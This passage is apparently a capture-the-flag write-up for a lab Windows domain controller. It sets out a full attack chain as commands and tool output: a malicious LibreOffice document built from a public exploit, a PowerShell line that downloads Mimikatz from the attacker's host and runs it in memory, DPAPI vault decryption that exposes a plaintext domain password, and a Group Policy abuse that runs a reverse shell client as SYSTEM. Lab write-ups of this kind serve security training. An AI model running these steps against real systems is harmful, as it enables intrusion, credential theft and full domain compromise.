OFFICE\Registry Editors                    Group            S-1-5-21-1199398058-4196589450-691661856-1106 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

- `LibreOffice 5.2` was installed at `1/17/2024`

```bash
PS C:\Windows\system32> (ls -Force C:\Users\*\Desktop\*) 2>$null


    Directory: C:\Users\Public\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          5/8/2021   1:18 AM            174 desktop.ini
-a----         1/17/2024   1:26 PM           1193 LibreOffice 5.2.lnk


    Directory: C:\Users\tstark\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         2/23/2024   6:27 AM             34 user.txt
```

- There's an `internal` site

```bash
PS C:\Users\web_account> (ls -Force C:\xampp\htdocs\ 2>$null) | sort LastWriteTime


    Directory: C:\xampp\htdocs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2023   3:10 PM                joomla
d-----          5/9/2023   7:53 AM                administrator
d-----         1/30/2024   8:39 AM                internal
```

- `resume.php` was created by `PPotts`

```bash
PS C:\xampp\htdocs\internal> ls -Force | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wrap

Mode   Owner                  LastWriteTime        Length FullName
----   -----                  -------------        ------ --------
d----- BUILTIN\Administrators 5/1/2023 4:27:15 PM         C:\xampp\htdocs\internal\css
d----- BUILTIN\Administrators 5/1/2023 4:27:15 PM         C:\xampp\htdocs\internal\img
-a---- BUILTIN\Administrators 1/30/2024 8:38:34 AM 5113   C:\xampp\htdocs\internal\index.html
-a---- OFFICE\PPotts          1/30/2024 8:40:24 AM 5282   C:\xampp\htdocs\internal\resume.php
d----- BUILTIN\Administrators 2/23/2024 7:36:59 AM        C:\xampp\htdocs\internal\applications
```

- I can't write files there

```bash
PS C:\xampp\htdocs\internal> icacls .
. NT AUTHORITY\LOCAL SERVICE:(I)(OI)(CI)(F)
  OFFICE\web_account:(I)(OI)(CI)(RX)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(F)
  BUILTIN\Users:(I)(OI)(CI)(RX)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

According to **apache** config, the site was listening on `localhost:8083`

```bash
PS C:\xampp> cat C:\xampp\apache\conf\httpd.conf | sls 'Listen' -context 0, 10

> # Listen: Allows you to bind Apache to specific IP addresses and/or
  # ports, instead of the default. See also the <VirtualHost>
  # directive.
  #
> # Change this to Listen on specific IP addresses as shown below to
  # prevent Apache from glomming onto all bound IP addresses.
  #
> #Listen 12.34.56.78:80
> Listen 80
> Listen 8083

  <VirtualHost *:8083>
      DocumentRoot "C:\xampp\htdocs\internal"
      ServerName localhost:8083

      <Directory "C:\xampp\htdocs\internal">
          Options -Indexes +FollowSymLinks +MultiViews
          AllowOverride All
          Require all granted
      </Directory>
> # XAMPP: We disable operating system specific optimizations for a listening
  # socket by the http protocol here. IE 64 bit make problems without this.

  AcceptFilter http none
  AcceptFilter https none
  # AJP13 Proxy
  <IfModule mod_proxy.c>
  <IfModule mod_proxy_ajp.c>
  Include "conf/extra/httpd-ajp.conf"
  </IfModule>
  </IfModule>
```

### Client side attack - Libre office


#### Foothold

Local port forward

```bash
ssh -J 127.0.0.1:443 office.tstark.dc -L 8083:127.0.0.1:8083 -N
```

Download `internal` web root

```bash
scp -J 127.0.0.1:443 -r office.tstark.dc:'C:/xampp/htdocs/internal' ./dump/internal
```

It's a resume upload site for internal uses

![](/assets/obsidian/e9999cc36c02c1650f5281601e20ecf5.png)

The file extension was checked by a strict whitelist filter that couldn't be bypassed

Only document files are allowed

![](/assets/obsidian/62af010856b31366bd719bb471ae1af5.png)

Since `LibreOffice` was installed on the box, lets assume a user will open and review the uploaded resumes

#### Create malicious odt document

Google : `Libre Office exploit github`

> https://github.com/elweth-sec/CVE-2023-2255

```bash
git clone https://github.com/elweth-sec/CVE-2023-2255
cd CVE-2023-2255
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office/exploit/CVE-2023-2255]
└─$ python CVE-2023-2255.py --cmd '\programdata\client.exe' --output poc.odt
File poc.odt has been created !
```

![](/assets/obsidian/23370fb1a4ebc21c6c80e07c40f58d15.png)

Wait for the bot to open the document

```bash
PS C:\xampp\htdocs\internal> ls .\applications\


    Directory: C:\xampp\htdocs\internal\applications


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/23/2024   9:40 AM          30501 a-it-30-000-0-5-years-a@a-com.odt
```

After waiting for 1 minute, I got a session as `ppotts`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ ssh 127.0.0.1 -p 443 ls -t
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 9b53e0739ca001b2fc9b9678b3f337035a8c3b28 | SSH-v2.4.1-windows_amd64 |
| e9fa95257de800475369fb27e143ed95761f7858 |                          |
| office.web_account.dc                    |                          |
| 10.10.11.3:50517                         |                          |
+------------------------------------------+--------------------------+
| af0842cd3227d350acfacfb75403aa0734fb5510 | SSH-v2.4.1-windows_amd64 |
| e9fa95257de800475369fb27e143ed95761f7858 |                          |
| office.tstark.dc                         |                          |
| 10.10.11.3:50516                         |                          |
+------------------------------------------+--------------------------+
| f0197eb2c3372525d661343b46bbe8fa6f3e74a1 | SSH-v2.4.1-windows_amd64 |
| e9fa95257de800475369fb27e143ed95761f7858 |                          |
| office.ppotts.dc                         |                          |
| 10.10.11.3:51979                         |                          |
+------------------------------------------+--------------------------+
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ ssh -J 127.0.0.1:443 office.ppotts.dc
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
Warning: Permanently added 'office.ppotts.dc' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Program Files\LibreOffice 5\program> whoami
office\ppotts
```


## Shell as hhogan


### Enum

```bash
PS C:\Program Files\LibreOffice 5\program> whoami /all

USER INFORMATION
----------------

User Name     SID
============= =============================================
office\ppotts S-1-5-21-1199398058-4196589450-691661856-1107


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
OFFICE\Registry Editors                    Group            S-1-5-21-1199398058-4196589450-691661856-1106 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

The powershell script at `C:\Users\PPotts\Music` was the bot that opens ODT documents

```bash
PS C:\Program Files\LibreOffice 5\program> (ls -Force C:\Users\*\Music\*) 2>$null


    Directory: C:\Users\PPotts\Music


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          5/4/2023  10:58 AM            504 desktop.ini
-a----         2/14/2024   5:36 PM           1858 job_offering.ps1
```

![](/assets/obsidian/9bce44beb4fc988b24f7e1f84db449f3.png)

- There were stored credentials for `hhogan`

```bash
PS C:\Program Files\LibreOffice 5\program> cmdkey /list

Currently stored credentials:

    Target: LegacyGeneric:target=MyTarget
    Type: Generic
    User: MyUser

    Target: Domain:interactive=office\hhogan
    Type: Domain Password
    User: office\hhogan
```

I tried to get vault credential but no luck

```bash
PS C:\Program Files\LibreOffice 5\program> iex (new-object net.webclient).DownloadString('http://10.10.14.99/Empire/credentials/Invoke-Mimikatz.ps1')
PS C:\Program Files\LibreOffice 5\program> Invoke-Mimikatz -Command 'vault::cred'
Hostname: DC.office.htb / S-1-5-21-1199398058-4196589450-691661856

  .#####.   mimikatz 2.2.0 (x64) #19041 Jan 29 2023 07:49:10
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # vault::cred
TargetName : MyTarget / <NULL>
UserName   : MyUser
Comment    : <NULL>
Type       : 1 - generic
Persist    : 3 - enterprise
Flags      : 00000000
Credential :
Attributes : 0

TargetName : LegacyGeneric:target=MyTarget / <NULL>
UserName   : MyUser
Comment    : <NULL>
Type       : 1 - generic
Persist    : 3 - enterprise
Flags      : 00000000
Credential :
Attributes : 0

TargetName : Domain:interactive=OFFICE\hhogan / <NULL>
UserName   : OFFICE\hhogan
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 3 - enterprise
Flags      : 00002004
Credential :
Attributes : 0
```

### Dump vault credentials via dpapi

> https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#dpapi-all-the-things

Get current user's SID

```bash
PS C:\Program Files\LibreOffice 5\program> whoami /user

USER INFORMATION
----------------

User Name     SID
============= =============================================
office\ppotts S-1-5-21-1199398058-4196589450-691661856-1107
```

List master keys

- The directory format for master key : `env:appdata\Microsoft\Protect\<USER-SID>\<gUIDMasterkey>`

```bash
PS C:\Program Files\LibreOffice 5\program> ls -Force $env:appdata\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107


    Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d
-a-hs-          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb
-a-hs-          5/2/2023   4:13 PM            900 BK-OFFICE
-a-hs-         1/17/2024   3:43 PM             24 Preferred
```

Extract master key

```bash
PS C:\Program Files\LibreOffice 5\program> Invoke-Mimikatz -Command '"dpapi::masterkey /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc"'
Hostname: DC.office.htb / S-1-5-21-1199398058-4196589450-691661856

  .#####.   mimikatz 2.2.0 (x64) #19041 Jan 29 2023 07:49:10
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # dpapi::masterkey /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 00000000 - 0
  dwMasterKeyLen     : 00000088 - 136
  dwBackupKeyLen     : 00000068 - 104
  dwCredHistLen      : 00000000 - 0
  dwDomainKeyLen     : 00000174 - 372
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : c521daa0857ee4fa6e4246266081e94c
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : a2741b13d7261697be4241ebbe05098a
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209

[domainkey]
  **DOMAINKEY**
    dwVersion        : 00000002 - 2
    dwSecretLen      : 00000100 - 256
    dwAccesscheckLen : 00000058 - 88
    guidMasterKey    : {e523832a-e126-4d6e-ac04-ed10da72b32f}
    pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
    pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665


Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107

[backupkey] without DPAPI_SYSTEM:
  key : 4d1b2c18baba7442e79d33cc771bf54027ae2500e08da3ecfccf91303bd471b6
  sha1: eeb787c4259e3c8b8408201ee5e54fc29fad22b2

[domainkey] with RPC
[DC] 'office.htb' will be the domain
[DC] 'DC.office.htb' will be the DC server
  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
```

![](/assets/obsidian/ef5481b09ca1c0a3245274b14ad17f4c.png)

After getting the master key, I can decrypt vaults from `$env:appdata\Microsoft\Credentials\`

```bash
PS C:\Program Files\LibreOffice 5\program> ls -Force $env:appdata\Microsoft\Credentials\


    Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E
-a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4
-a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E
```

```bash
PS C:\Program Files\LibreOffice 5\program> Invoke-Mimikatz -Command '"dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166"'
Hostname: DC.office.htb / S-1-5-21-1199398058-4196589450-691661856

  .#####.   mimikatz 2.2.0 (x64) #19041 Jan 29 2023 07:49:10
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
  dwDataLen          : 000000c0 - 192
  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
  dwSignLen          : 00000014 - 20
  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976

Decrypting Credential:
 * masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000be - 190
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 5/9/2023 11:03:21 PM
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:interactive=OFFICE\HHogan
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : OFFICE\HHogan
  CredentialBlob : H4ppyFtW183#
  Attributes     : 0
```

The credential is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ nxc smb $(pt get rhost) -u 'HHogan' -p 'H4ppyFtW183#'
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\HHogan:H4ppyFtW183#
```

### Get a shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ nxc winrm $(pt get rhost) -u 'HHogan' -p 'H4ppyFtW183#' -X '\programdata\client.exe'
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb)
WINRM       10.10.11.3      5985   DC               [+] office.htb\HHogan:H4ppyFtW183# (Pwn3d!)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ ssh 127.0.0.1 -p 443 ls -t
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 13841cc29d21500689efa9be840bc6181aee60fe | SSH-v2.4.1-windows_amd64 |
| e9fa95257de800475369fb27e143ed95761f7858 |                          |
| office.ppotts.dc                         |                          |
| 10.10.11.3:55736                         |                          |
+------------------------------------------+--------------------------+
| 3c159c88882d3490a000e603451fc756f3f923ce | SSH-v2.4.1-windows_amd64 |
| e9fa95257de800475369fb27e143ed95761f7858 |                          |
| office.web_account.dc                    |                          |
| 10.10.11.3:55712                         |                          |
+------------------------------------------+--------------------------+
| d621752c4557b5f0d8cd13519b32f81c827478f7 | SSH-v2.4.1-windows_amd64 |
| e9fa95257de800475369fb27e143ed95761f7858 |                          |
| office.hhogan.dc                         |                          |
| 10.10.11.3:56255                         |                          |
+------------------------------------------+--------------------------+
| fa4fac1a9973cfbf3d96441c10cab5170c66ce57 | SSH-v2.4.1-windows_amd64 |
| e9fa95257de800475369fb27e143ed95761f7858 |                          |
| office.tstark.dc                         |                          |
| 10.10.11.3:55725                         |                          |
+------------------------------------------+--------------------------+
```

## From hhogan to administrator


### Abuse GPO with pyGPOAbuse

As we enumerated with `ldeep` previously, `HHogan` have `GPO Managers` group which allows us to execute commands on computers as Administrator with custom group policy

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ ssh -J 127.0.0.1:443 office.hhogan.dc
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
Warning: Permanently added 'office.hhogan.dc' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\HHogan\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
OFFICE\GPO Managers                         Group            S-1-5-21-1199398058-4196589450-691661856-1117 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

Clone **pyGPOAbuse**

```bash
git clone https://github.com/Hackndo/pyGPOAbuse
cd pyGPOAbuse
```

List group policies with their IDs

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ cat ldeep/_gpo.json | jq '.[] | (.displayName + "|" + .cn)' -r | column -t -s "|"
Windows Update Domain Policy           {86E68A9A-F5E9-49B9-A1E3-9CCDAA9251B4}
Windows Firewall GPO                   {04FE5C75-0078-4D44-97C5-8A796BE906EC}
Windows Update GPO                     {7B6165C4-C41D-47ED-9A37-E1A058F230C1}
Software Installation GPO              {9D183BB5-7581-4C19-9390-B1EBCCACCE99}
Password Policy GPO                    {EC1FEBA4-DB03-4721-81DB-B0BAA61FFA18}
Default Active Directory Settings GPO  {37238285-35D0-4D0C-A702-B489C38ED505}
Default Domain Controllers Policy      {6AC1786C-016F-11D2-945F-00C04fB984F9}
Default Domain Policy                  {31B2F340-016D-11D2-945F-00C04FB984F9}
```

I had to convert password to NTLM hash since **pyGPOAbuse** have a bug with special characters in password

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office/exploit/pyGPOAbuse]
└─$ python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "H4ppyFtW183#".encode("utf-16le")).digest()).decode())'
6a626de046afdb1ece5118d54649b347
```

Add a task to the `Default Domain Policy` GPO to execute my reverse ssh client

> If this error message shows up : `[x] LDAP connection failed`, it means the server did not successfully started AD services, reset the machine to fix it
> 
> ![](/assets/obsidian/ce805f492eac1c1284440b0435c73099.png)
{: .prompt-danger }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office/exploit/pyGPOAbuse]
└─$ python pygpoabuse.py office.htb/HHogan -hashes 0:6a626de046afdb1ece5118d54649b347 -command 'C:\programdata\client.exe' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -f -vv -dc-ip $(pt get ip) -ldaps
DEBUG:root:Connected to SYSVOL
[*] Connected to SYSVOL
DEBUG:root:GPO id 31B2F340-016D-11D2-945F-00C04FB984F9 exists
[*] GPO id 31B2F340-016D-11D2-945F-00C04FB984F9 exists
DEBUG:root:office.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine/ exists
[*] office.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine/ exists
DEBUG:root:office.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine/Preferences/ created
[*] office.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine/Preferences/ created
DEBUG:root:office.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine/Preferences/ScheduledTasks/ created
[*] office.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine/Preferences/ScheduledTasks/ created
DEBUG:root:ScheduledTasks.xml does not exist. Creating it...
[*] ScheduledTasks.xml does not exist. Creating it...
DEBUG:root:ScheduledTasks.xml created
[*] ScheduledTasks.xml created
DEBUG:root:c:\windows\system32\cmd.exe /c "C:\programdata\client.exe"
[*] c:\windows\system32\cmd.exe /c "C:\programdata\client.exe"
DEBUG:root:ScheduledTasks.xml has been saved
[*] ScheduledTasks.xml has been saved
DEBUG:asyncio:Using selector: EpollSelector
[*] Using selector: EpollSelector
DEBUG:root:hashlib using "builtin" for "md5"
[*] hashlib using "builtin" for "md5"
DEBUG:root:hmac using "builtin" for "md5"
[*] hmac using "builtin" for "md5"
DEBUG:root:hmac using "builtin" for "md5"
[*] hmac using "builtin" for "md5"
DEBUG:root:hmac using "builtin" for "md5"
[*] hmac using "builtin" for "md5"
DEBUG:root:hmac using "builtin" for "md5"
[*] hmac using "builtin" for "md5"
DEBUG:root:hashlib using "builtin" for "md5"
[*] hashlib using "builtin" for "md5"
DEBUG:root:hashlib using "builtin" for "md5"
[*] hashlib using "builtin" for "md5"
DEBUG:root:hashlib using "builtin" for "md5"
[*] hashlib using "builtin" for "md5"
DEBUG:root:hashlib using "builtin" for "md5"
[*] hashlib using "builtin" for "md5"
DEBUG:root:hmac using "builtin" for "md5"
[*] hmac using "builtin" for "md5"
DEBUG:root:New extensionName: [{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
[*] New extensionName: [{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
DEBUG:root:Updated version number : 19
[*] Updated version number : 19
DEBUG:root:gpt.ini file successfully updated
[*] gpt.ini file successfully updated
INFO:root:Version updated
[*] Version updated
SUCCESS:root:ScheduledTask TASK_55b02354 created!
[+] ScheduledTask TASK_55b02354 created!
```

Force update group policy immediately

```bash
PS C:\Users\HHogan\Documents> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

Got a session as `nt authority system`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
